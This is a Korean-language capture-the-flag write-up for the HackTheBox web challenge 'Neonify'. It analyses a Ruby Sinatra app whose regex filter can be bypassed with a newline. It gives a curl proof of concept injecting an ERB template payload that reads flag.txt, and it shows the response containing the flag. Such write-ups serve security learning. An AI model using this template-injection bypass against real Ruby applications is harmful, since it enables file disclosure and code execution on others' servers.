# Neonify
![Ruby](https://img.shields.io/badge/ruby-%23CC342D.svg?style=for-the-badge&logo=ruby&logoColor=white)


![image](https://github.com/user-attachments/assets/7a59c2b2-2607-489b-b07f-1880aa5dc6af)

## Source Code analysis
```
FROM ruby:2.7.5-alpine3.15

# Install supervisor
RUN apk add --update --no-cache supervisor

# Setup user
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Copy challenge files
RUN mkdir /app
COPY challenge/              /app
COPY config/supervisord.conf /etc/supervisord.conf

# Install dependencies
WORKDIR /app
RUN bundle install
RUN gem install shotgun

# Expose the app port
EXPOSE 1337

# Start supervisord
ENTRYPOINT ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```
- ```Dockerfile```을 보면 ```flag```가 루트 디렉토리(```challenge/```)아래에 있다는 것을 알 수 있다.

```
class NeonControllers < Sinatra::Base
  configure do
    set :views,      "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
end
```
- 위 코드는 ```ruby```로 작성된 Web Application Server 이다.
- ```POST```요청 시 정규 표현식 블랙리스트를 우회하여 SSTI를 해야한다.
- 정규식을 처리할 때 ```=~```로 처리하지만 ```[0~9a-z]```는 개행을 명시적으로 제외하지 않으면 거르지 못한다.

## PoC
```
curl -X POST \
  -d 'neon=a%0A%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' \
  http://159.65.20.166:31584/
```
- 요청시 개행을 추가하여 정규식 블랙리스트 우회

```
<!DOCTYPE html>
<html>
<head>
  <title>Neonify</title>
  <link rel="stylesheet" href="stylesheets/style.css">
  <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
  <div class="wrapper">
    <h1 class="title">Amazing Neonify Generator</h1>
    <form action="/" method="post">
      <p>Enter Text to Neonify</p><br>
      <input type="text" name="neon" value="">
      <input type="submit" value="Submit">
    </form>
    <h1 class="glow">
      a<br>
      HTB{r3pl4c3m3n7_s3cur1ty}
    </h1>
  </div>
</body>
</html>
```
- 응답으로 플래그 획득
